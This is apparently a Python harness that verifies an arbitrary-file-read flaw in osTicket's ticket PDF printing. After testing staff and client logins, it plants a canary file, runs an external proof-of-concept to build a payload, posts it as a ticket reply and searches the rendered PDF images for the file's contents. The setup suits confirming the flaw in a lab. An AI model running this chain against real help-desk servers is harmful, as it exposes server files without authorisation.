from pathlib import Path
import base64,hashlib,json,os,re,subprocess,sys
from native_http import Client,Forms
runtime=json.loads(Path(sys.argv[1]).read_text());out=Path(runtime['directory']);seed=json.loads((out/'native-seed.json').read_text());report={'owner_loaded':False,'requests':[],'commands':[],'phase':'native-auth-and-pdf','passed':False};env=dict(os.environ,DOCKER_CONTEXT='default',BUILDX_BUILDER='default')
def save():(out/'http-controls.json').write_text(json.dumps(report,indent=2)+'\n')
def command(label,args,data=None):
 p=subprocess.run(args,input=data,capture_output=True,env=env,timeout=120);(out/(label+'.stdout')).write_bytes(p.stdout);(out/(label+'.stderr')).write_bytes(p.stderr);report['commands'].append({'label':label,'argv':args,'exit':p.returncode});save();assert p.returncode==0,(label,p.stderr[-1000:]);return p.stdout
compose=runtime['compose'];php=compose+['exec','-T','--user','33','app','php','-r']
def decode_pdf(label,body):
 assert body.startswith(b'%PDF-'),(label,len(body),body[:100]);name='/tmp/osticket-native-'+runtime['phase']+'-'+label;directory=name+'-images'
 command(label+'-put',php+['$d=stream_get_contents(STDIN);if(file_put_contents($argv[1],$d)!==strlen($d))exit(1);if(!mkdir($argv[2],0700))exit(2);',name+'.pdf',directory],body)
 text=command(label+'-text',compose+['exec','-T','--user','33','app','pdftotext',name+'.pdf','-']);assert b'NATIVE_OSTICKET_BASELINE_MARKER'in text,(label,text[-500:])
 command(label+'-images',compose+['exec','-T','--user','33','app','pdfimages',name+'.pdf',directory+'/image'])
 raw=command(label+'-image-data',php+['$o=[];foreach(glob($argv[1]."/*")as$p)$o[basename($p)]=base64_encode(file_get_contents($p));echo json_encode($o);',directory]);images=json.loads(raw);pixels=[]
 for filename,value in images.items():
  data=base64.b64decode(value);(out/(label+'-'+filename)).write_bytes(data)
  if data.startswith(b'P6'):
   match=re.match(rb'P6\s+(\d+)\s+(\d+)\s+255\s',data);assert match
   rgb=data[match.end():];assert len(rgb)==int(match[1])*int(match[2])*3
   bgr=b''.join(rgb[i:i+3][::-1]for i in range(0,len(rgb),3));pixels.extend([rgb,bgr])
 report.setdefault('pdfs',[]).append({'label':label,'bytes':len(body),'sha256':hashlib.sha256(body).hexdigest(),'images':len(images)});save();return pixels
try:
 clients={}
 for portal,prefix,login,user,field in [('staff','/scp','/scp/login.php','module_admin','userid'),('client','','/login.php',runtime['client_email'],'luser')]:
  path=prefix+'/tickets.php?id='+str(seed['ticket_id']);bad=Client(portal+'-wrong',runtime,report,save)
  status,body=bad.request('login-form',login);assert status==200
  status,body=bad.request('login',login,{'__CSRFToken__':bad.token(body),field:user,'passwd'if portal=='staff'else'lpasswd':'Wrong-password42!'})
  status,body=bad.request('protected-denied',path);assert b'NATIVE_OSTICKET_BASELINE_MARKER'not in body and (b'name="lpasswd"'in body or b'name="passwd"'in body),(portal,status)
  good=Client(portal,runtime,report,save);status,body=good.request('login-form',login);assert status==200
  status,body=good.request('login',login,{'__CSRFToken__':good.token(body),field:user,'passwd'if portal=='staff'else'lpasswd':runtime['password']})
  status,body=good.request('protected-ticket',path);assert status==200 and b'NATIVE_OSTICKET_BASELINE_MARKER'in body,(portal,status)
  clients[portal]=good;status,body=good.request('ordinary-pdf',prefix+'/tickets.php?a=print&id='+str(seed['ticket_id']));assert status==200;decode_pdf(portal+'-ordinary',body)
 report['both_auth_paths_passed']=True;save()
 canary=b'MCV_NATIVE_FILE_ONLY_62a8c9! exact file bytes.\nSecond line: aB_Z-0123.\n';canary_path='/tmp/module-target-osticket-native-canary.txt'
 command('canary-put',php+['$d=stream_get_contents(STDIN);if(file_put_contents($argv[1],$d)!==strlen($d))exit(1);echo json_encode(["uid"=>posix_geteuid(),"bytes"=>strlen($d),"sha256"=>hash("sha256",file_get_contents($argv[1]))]);',canary_path],canary)
 payload=command('primary-poc',[sys.executable,runtime['poc_path'],'-r','-f',canary_path+',b64']).decode();assert canary.decode()not in payload
 status,body=clients['client'].request('reply-form','/tickets.php?id='+str(seed['ticket_id']));forms=[v for v in Forms(body).forms if v['fields'].get('a')=='reply'];assert len(forms)==1
 form=forms[0];assert len(form['textareas'])==1;fields=dict(form['fields']);fields[form['textareas'][0]]=payload;status,body=clients['client'].request('poc-reply','/tickets.php?id='+str(seed['ticket_id']),fields);assert status==200 and b'Message Posted Successfully'in body
 for portal,prefix in [('staff','/scp'),('client','')]:
  status,body=clients[portal].request('poc-pdf',prefix+'/tickets.php?a=print&id='+str(seed['ticket_id']));assert status==200;pixels=decode_pdf(portal+'-poc',body);found=any(base64.b64encode(canary)in p for p in pixels)
  report.setdefault('canary_results',{})[portal]={'found_exact_base64':found,'expected':runtime['release']=='1.18.2','sha256':hashlib.sha256(canary).hexdigest()};save();assert found==(runtime['release']=='1.18.2'),(portal,'Independent file-read expectation failed')
 report['passed']=True
except BaseException as error:report['failure']={'type':type(error).__name__,'message':str(error)};raise
finally:save()
